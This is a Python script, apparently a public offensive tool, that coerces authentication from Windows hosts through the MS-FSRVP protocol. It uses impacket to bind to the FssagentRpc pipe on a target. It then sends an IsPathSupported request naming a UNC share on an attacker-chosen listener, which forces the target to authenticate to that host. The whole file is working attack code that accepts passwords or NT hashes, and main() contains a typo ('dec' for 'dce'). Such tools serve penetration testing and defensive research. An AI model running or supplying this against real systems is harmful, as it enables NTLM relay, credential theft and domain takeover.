#!/usr/bin/python3
#
#Authors:
#	@Wh04m1 (https://github.com/Wh04m1001)
#
#Credits:
#	@topotam (https://github.com/topotam)
#
#
#Description:
#	Coerce authentication from Windows hosts via MS-FSRVP (Requires FS-VSS-AGENT service running on host)
# 






import sys
import argparse

from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import ULONG, WSTR 
from impacket.dcerpc.v5.rpcrt import DCERPCException,RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin
from impacket.examples import logger											   
import logging


class DCERPCSessionError(DCERPCException):
	def __init__(self, error_string=None, error_code=None, packet=None):
		DCERPCException.__init__(self, error_string, error_code, packet)

	def __str__( self ):
		key = self.error_code
		if key in system_errors.ERROR_MESSAGES:
			error_msg_short = system_errors.ERROR_MESSAGES[key][0]
			error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
			return 'MS-FSRVP SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
		else:
			return 'MS-FSRVP SessionError: unknown error code: 0x%x' % self.error_code



class IsPathSupported(NDRCALL):
	opnum=8 
	structure = (('ShareName',WSTR),)

class IsPathSupportedResponse(NDRCALL):
	structure=(('ErroCode',ULONG))

class VSSTrigger:
	def bind(self,username,password,domain,nthash,lmhash,target):

		#'MSRPC_UUID_FSRVP': ('a8e0653c-2744-4389-a61d-7373df8b2292','1.0')
		rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\FssagentRpc]' % target)
		rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
		dce = rpctransport.get_dce_rpc()
		dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

		logging.info("Connecting to ncacn_np:%s[\\PIPE\\FssagentRpc]" % target)

		try:
			dce.connect()
		except Exception as e:
			logging.error("Something went wrong, check error status => %s" % str(e))  
			sys.exit()
		logging.info("Connected!")
		logging.info("Binding to a8e0653c-2744-4389-a61d-7373df8b2292")
		try:
			dce.bind(uuidtup_to_bin(('a8e0653c-2744-4389-a61d-7373df8b2292','1.0')))
		except Exception as e:
			print("Something went wrong, check error status => %s" % str(e)) 
			sys.exit()
		logging.info("Successfully bound!")
		return dce
	def IsPathSupported(self, dce, listener):
		try:
			request = IsPathSupported()
			request['ShareName'] = '\\\\%s\\netlogon\x00' % listener
			request.dump()
			resp = dce.request(request)
		except Exception as e:
			logging.error("Something went wrong => %s",str(e)) 
			sys.exit()


def main():
	parser = argparse.ArgumentParser(add_help = True, description = "")
	parser.add_argument('-u', '--username', action="store", default='', help='valid username')
	parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked)')
	parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
	parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
	parser.add_argument('listener', help='ip address or hostname of listener')
	parser.add_argument('target', help='ip address or hostname of target')
	options = parser.parse_args()


	logger.init()
	logging.getLogger().setLevel(logging.INFO)


	if options.hashes is not None:
		lmhash, nthash = options.hashes.split(':')
	else:
		lmhash = ''
		nthash = ''

   

	if options.password == '' and options.username != '' and options.hashes is None :
		from getpass import getpass
		options.password = getpass("Password:")
	
	vss = VSSTrigger()
	dce = vss.bind(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target)
	vss.IsPathSupported(dce,options.listener)
	dec.disconnect()
	sys.exit()


if __name__ == '__main__':
	main()
